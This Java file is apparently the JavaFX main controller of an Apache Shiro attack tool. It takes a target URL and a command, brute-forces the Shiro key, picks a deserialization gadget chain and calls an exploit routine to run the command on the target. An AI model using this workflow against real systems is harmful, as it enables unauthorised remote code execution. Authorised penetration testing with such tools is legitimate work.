package ui;

import core.GadgetsDetect;
import core.ShiroKeyDetect;
import entity.ControllersFactory;
import javafx.fxml.FXML;

import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.scene.text.Text;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.ResourceBundle;

public class MainController implements Initializable {

    @FXML
    private Button button;

    @FXML
    private TextField attackUrl;

    @FXML
    public TextArea result;

    @FXML
    public TextField cmd;

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        ControllersFactory.controllers.put(MainController.class.getSimpleName(),this);
    }

    @FXML
    public void execResult() throws Exception {

        //先判断是否为shiro框架，然后爆破shirokey
        Thread thread = new Thread(()->{
            String shirokey="";
            String mode="";
            String gadget = "";
            ShiroKeyDetect shiroKeyDetect = new ShiroKeyDetect();
            String targetUrl = attackUrl.getText();
            String cmd1 = cmd.getText();
            if(ShiroKeyDetect.isShiro(targetUrl)){
                try {
                    Map<String,String> map = new HashMap<String,String>();
                    map = shiroKeyDetect.ShiroKey(targetUrl);
                    //用shirokey爆破gadgets链
                    shirokey = map.get("shirokey");
                    mode = map.get("mode");
                    GadgetsDetect gadgetsDetect = new GadgetsDetect();
                    gadget = gadgetsDetect.GadgetsBurp(targetUrl,shirokey,mode);
                    gadgetsDetect.GadgetsExp(targetUrl,shirokey,mode,gadget,cmd1);

                } catch (Exception e) {
                    e.printStackTrace();
                }

            }else {
                result.appendText("未检测到shiro框架"+"\n");
            }


        });
        thread.start();
    }

}
